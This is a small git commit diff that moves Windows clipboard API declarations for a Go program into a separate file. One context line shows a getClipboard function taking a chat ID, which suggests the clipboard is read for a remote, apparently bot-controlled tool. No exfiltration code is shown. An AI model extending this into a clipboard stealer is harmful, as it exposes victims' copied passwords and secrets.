57ee08d97c56c6cdf8074f6283c2740271af0b95
Itay Migdal <32266629+itaymigdal@users.noreply.github.com>
2024-09-13 08:23:56 +0300

    bit formatting

---
+++ ResolveWinApi.go
@@ -0,0 +1,17 @@
+package main
+
+import (
+	"syscall"
+	
+)
+
+var (
+	user32                  = syscall.NewLazyDLL("user32.dll")
+	kernel32                = syscall.NewLazyDLL("kernel32.dll")
+	openClipboard           = user32.NewProc("OpenClipboard")
+	closeClipboard          = user32.NewProc("CloseClipboard")
+	getClipboardData        = user32.NewProc("GetClipboardData")
+	globalLock              = kernel32.NewProc("GlobalLock")
+	globalUnlock            = kernel32.NewProc("GlobalUnlock")
+	CF_UNICODETEXT   uint32 = 13
+)
--- clipboard.go
+++ clipboard.go
@@ -5,16 +5,7 @@ import (
 	"unsafe"
 )
 
-var (
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	kernel32                = syscall.NewLazyDLL("kernel32.dll")
-	openClipboard           = user32.NewProc("OpenClipboard")
-	closeClipboard          = user32.NewProc("CloseClipboard")
-	getClipboardData        = user32.NewProc("GetClipboardData")
-	globalLock              = kernel32.NewProc("GlobalLock")
-	globalUnlock            = kernel32.NewProc("GlobalUnlock")
-	CF_UNICODETEXT   uint32 = 13
-)
+
 
 func getClipboard(chatID int64) {
 	
